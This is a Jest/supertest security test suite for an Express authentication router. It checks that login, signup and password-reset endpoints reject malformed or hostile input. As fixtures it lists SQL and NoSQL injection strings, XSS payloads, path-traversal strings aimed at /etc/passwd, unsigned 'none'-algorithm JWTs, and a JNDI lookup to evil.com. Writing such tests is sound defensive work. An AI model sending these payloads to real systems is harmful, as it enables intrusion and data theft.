import request from 'supertest';
import express from 'express';
import authRouter from '../../routes/authRouter';
import { User } from '../../models/User';
import { createTestUser } from '../helpers/testUtils';

const app = express();
app.use(express.json());
app.use('/auth', authRouter);

describe('AuthRouter Security Tests', () => {
  describe('Authorization Bypass Vulnerabilities', () => {
    test('should prevent access with invalid Bearer token formats', async () => {
      const invalidTokens = [
        'Bearer',
        'Bearer ',
        'Bearer invalid',
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
        'NotBearer valid_token_here',
        'bearer lowercase_bearer',
      ];

      for (const token of invalidTokens) {
        const response = await request(app)
          .post('/auth/login')
          .set('Authorization', token)
          .send({ email: 'test@example.com', password: 'password123' });
        
        // Auth endpoints don't require authentication but should handle malformed tokens gracefully
        expect(response.status).not.toBe(500);
      }
    });

    test('should prevent JWT confusion attacks', async () => {
      const maliciousPayloads = [
        // Algorithm confusion
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        // None algorithm
        'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.',
        // Invalid structure
        'invalid.jwt.token',
        // Malformed base64
        'eyJ!!!invalid!!!.eyJ!!!invalid!!!.invalid',
      ];

      for (const token of maliciousPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .set('Authorization', `Bearer ${token}`)
          .send({ email: 'test@example.com', password: 'password123' });
        
        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('API Parameter Pollution Attacks', () => {
    test('should handle duplicate email parameters in login', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send('email=test1@example.com&email=test2@example.com&password=password123')
        .set('Content-Type', 'application/x-www-form-urlencoded');
      
      expect(response.status).toBe(400);
    });

    test('should handle array injection in login parameters', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send({
          email: ['admin@example.com', 'user@example.com'],
          password: ['admin123', 'user123'],
          extraParam: { nested: 'value' }
        });
      
      expect(response.status).toBe(400);
    });

    test('should handle parameter pollution in signup', async () => {
      const pollutedData = {
        firstName: ['John', 'Admin'],
        lastName: ['Doe', 'Root'],
        email: ['user@test.com', 'admin@test.com'],
        password: 'Password123!',
        phoneNumber: '+1234567890',
        gender: ['male', 'admin'],
        dateOfBirth: '01-01-1990',
        for_Profile: 'myself'
      };

      const response = await request(app)
        .post('/auth/signup')
        .send(pollutedData);
      
      expect(response.status).toBe(400);
    });
  });

  describe('Input Validation Bypass Attacks', () => {
    test('should prevent SQL injection in email parameter', async () => {
      const sqlInjectionPayloads = [
        "admin@test.com'; DROP TABLE users; --",
        "admin@test.com' OR '1'='1",
        "admin@test.com'; UPDATE users SET role='admin'; --",
        "admin@test.com' UNION SELECT * FROM admin_users; --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: payload, password: 'password123' });
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      }
    });

    test('should prevent NoSQL injection attempts', async () => {
      const noSqlInjectionPayloads = [
        { $ne: null },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
        { $gt: '' },
        ['admin@test.com'],
      ];

      for (const payload of noSqlInjectionPayloads) {
        const response = await request(app)
          .post('/auth/login')
          .send({ email: payload, password: 'password123' });
        
        expect(response.status).toBe(400);
      }
    });

    test('should prevent XSS in text fields during signup', async () => {
      const xssPayloads = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "';alert(String.fromCharCode(88,83,83));//'",
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/auth/signup')
          .send({
            firstName: payload,
            lastName: 'Test',
            email: 'test@example.com',
            password: 'Password123!',
            phoneNumber: '+1234567890',
            gender: 'male',
            dateOfBirth: '01-01-1990',
            for_Profile: 'myself'
          });
        
        expect(response.status).toBe(400);
      }
    });

    test('should validate phone number format strictly', async () => {
      const invalidPhoneNumbers = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "javascript:alert(1)",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/x}",
        "1234567890123456789012345", // Too long
      ];

      for (const phoneNumber of invalidPhoneNumbers) {
        const response = await request(app)
          .post('/auth/signup')
          .send({
            firstName: 'Test',
            lastName: 'User',
            email: 'test@example.com',
            password: 'Password123!',
            phoneNumber: phoneNumber,
            gender: 'male',
            dateOfBirth: '01-01-1990',
            for_Profile: 'myself'
          });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('HTTP Method Override Attacks', () => {
    test('should not allow method override on login endpoint', async () => {
      const response = await request(app)
        .get('/auth/login')
        .set('X-HTTP-Method-Override', 'POST')
        .query({ email: 'test@example.com', password: 'password123' });
      
      expect(response.status).toBe(404);
    });

    test('should not accept GET requests on POST-only endpoints', async () => {
      const endpoints = [
        '/auth/login',
        '/auth/signup',
        '/auth/forgot-password',
        '/auth/send-email-otp',
        '/auth/verify-email-otp',
      ];

      for (const endpoint of endpoints) {
        const response = await request(app).get(endpoint);
        expect(response.status).toBe(404);
      }
    });

    test('should not accept PUT/PATCH requests on POST-only endpoints', async () => {
      const response = await request(app)
        .put('/auth/login')
        .send({ email: 'test@example.com', password: 'password123' });
      
      expect(response.status).toBe(404);
    });
  });

  describe('Rate Limiting Security', () => {
    test('should enforce rate limiting on login endpoint', async () => {
      // Make multiple rapid requests to trigger rate limiting
      const promises = [];
      for (let i = 0; i < 20; i++) {
        promises.push(
          request(app)
            .post('/auth/login')
            .send({ email: `test${i}@example.com`, password: 'password123' })
        );
      }

      const responses = await Promise.all(promises);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('should enforce rate limiting on OTP endpoints', async () => {
      const promises = [];
      for (let i = 0; i < 15; i++) {
        promises.push(
          request(app)
            .post('/auth/send-email-otp')
            .send({ email: `test${i}@example.com` })
        );
      }

      const responses = await Promise.all(promises);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Response Data Leakage', () => {
    test('should not leak sensitive information in error responses', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send({ email: 'nonexistent@example.com', password: 'wrongpassword' });
      
      expect(response.body).not.toHaveProperty('user');
      expect(response.body).not.toHaveProperty('hashedPassword');
      expect(response.body).not.toHaveProperty('mongoId');
      expect(response.body.message).not.toContain('SELECT');
      expect(response.body.message).not.toContain('password');
    });

    test('should not expose system information in error messages', async () => {
      const response = await request(app)
        .post('/auth/signup')
        .send({ invalid: 'data' });
      
      expect(response.body.message).not.toContain('mongoose');
      expect(response.body.message).not.toContain('mongodb');
      expect(response.body.message).not.toContain('process.env');
      expect(response.body.message).not.toContain('/Users/');
      expect(response.body.message).not.toContain('C:\\');
    });
  });

  describe('Directory Traversal Attempts', () => {
    test('should prevent directory traversal in reset password token', async () => {
      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ];

      for (const payload of traversalPayloads) {
        const response = await request(app)
          .post(`/auth/reset-password/${payload}`)
          .send({ password: 'NewPassword123!' });
        
        expect(response.status).toBe(400);
      }
    });
  });

  describe('API Information Disclosure', () => {
    test('should not expose API version information', async () => {
      const response = await request(app)
        .get('/auth/')
        .set('Accept', 'application/json');
      
      expect(response.headers).not.toHaveProperty('x-api-version');
      expect(response.headers).not.toHaveProperty('server');
      expect(response.body).not.toHaveProperty('version');
    });

    test('should not expose debug information', async () => {
      const response = await request(app)
        .post('/auth/login')
        .send({ email: 'test@example.com', password: 'password123' })
        .set('X-Debug', 'true');
      
      expect(response.body).not.toHaveProperty('debug');
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('env');
    });
  });

  describe('CORS Security', () => {
    test('should handle CORS preflight requests securely', async () => {
      const response = await request(app)
        .options('/auth/login')
        .set('Origin', 'https://malicious-site.com')
        .set('Access-Control-Request-Method', 'POST')
        .set('Access-Control-Request-Headers', 'Content-Type,Authorization');
      
      // Should either reject or handle according to CORS policy
      if (response.headers['access-control-allow-origin']) {
        expect(response.headers['access-control-allow-origin']).not.toBe('*');
      }
    });

    test('should not reflect arbitrary origins', async () => {
      const maliciousOrigins = [
        'https://evil.com',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'null',
      ];

      for (const origin of maliciousOrigins) {
        const response = await request(app)
          .post('/auth/login')
          .set('Origin', origin)
          .send({ email: 'test@example.com', password: 'password123' });
        
        if (response.headers['access-control-allow-origin']) {
          expect(response.headers['access-control-allow-origin']).not.toBe(origin);
        }
      }
    });
  });

  describe('Content Security Violations', () => {
    test('should handle malicious content-type headers', async () => {
      const maliciousContentTypes = [
        'application/json; charset=utf-7',
        'text/html',
        'application/x-www-form-urlencoded; boundary=--evil',
        'multipart/form-data',
        '../../../etc/passwd',
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request(app)
          .post('/auth/login')
          .set('Content-Type', contentType)
          .send('{"email":"test@example.com","password":"password123"}');
        
        // Should reject or handle safely
        expect(response.status).not.toBe(500);
      }
    });

    test('should handle oversized payloads', async () => {
      const largePayload = {
        email: 'test@example.com',
        password: 'a'.repeat(100000), // Very large password
        firstName: 'x'.repeat(50000),
        lastName: 'y'.repeat(50000),
      };

      const response = await request(app)
        .post('/auth/signup')
        .send(largePayload);
      
      expect(response.status).toBe(400);
    });
  });

  describe('Authentication Edge Cases', () => {
    test('should handle concurrent login attempts safely', async () => {
      const user = await createTestUser({
        email: 'concurrent@test.com',
        password: 'hashedpassword123'
      });

      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          request(app)
            .post('/auth/login')
            .send({ email: 'concurrent@test.com', password: 'wrongpassword' })
        );
      }

      const responses = await Promise.all(promises);
      // All should fail, none should cause race conditions
      responses.forEach(response => {
        expect(response.status).toBe(400);
      });
    });

    test('should prevent timing attacks on password verification', async () => {
      const user = await createTestUser({
        email: 'timing@test.com',
        password: 'hashedpassword123'
      });

      const startTime = Date.now();
      const response1 = await request(app)
        .post('/auth/login')
        .send({ email: 'timing@test.com', password: 'wrongpassword' });
      const time1 = Date.now() - startTime;

      const startTime2 = Date.now();
      const response2 = await request(app)
        .post('/auth/login')
        .send({ email: 'nonexistent@test.com', password: 'wrongpassword' });
      const time2 = Date.now() - startTime2;

      // Response times should be similar to prevent user enumeration
      const timeDifference = Math.abs(time1 - time2);
      expect(timeDifference).toBeLessThan(100); // Allow some variance
    });
  });

  describe('Session Management Security', () => {
    test('should handle malicious cookie headers', async () => {
      const maliciousCookies = [
        'token=../../etc/passwd',
        'token=<script>alert(1)</script>',
        'token=' + 'x'.repeat(10000),
        'token=; Path=/admin',
      ];

      for (const cookie of maliciousCookies) {
        const response = await request(app)
          .post('/auth/login')
          .set('Cookie', cookie)
          .send({ email: 'test@example.com', password: 'password123' });
        
        expect(response.status).not.toBe(500);
      }
    });

    test('should not accept tokens from unusual locations', async () => {
      const response = await request(app)
        .post('/auth/login')
        .query({ token: 'malicious_token' })
        .send({ email: 'test@example.com', password: 'password123' });
      
      // Should not use query parameter as authentication token
      expect(response.status).not.toBe(200);
    });
  });

  describe('API Versioning Security', () => {
    test('should not expose version information through headers', async () => {
      const versionHeaders = [
        'X-API-Version',
        'API-Version',
        'Version',
        'X-Version',
        'Accept-Version',
      ];

      const response = await request(app)
        .post('/auth/login')
        .send({ email: 'test@example.com', password: 'password123' });

      for (const header of versionHeaders) {
        expect(response.headers[header.toLowerCase()]).toBeUndefined();
      }
    });

    test('should handle version manipulation attempts', async () => {
      const versionHeaders = {
        'X-API-Version': '../../../admin',
        'API-Version': '999.999.999',
        'Accept-Version': '<script>alert(1)</script>',
      };

      for (const [header, value] of Object.entries(versionHeaders)) {
        const response = await request(app)
          .post('/auth/login')
          .set(header, value)
          .send({ email: 'test@example.com', password: 'password123' });
        
        expect(response.status).not.toBe(500);
      }
    });
  });
});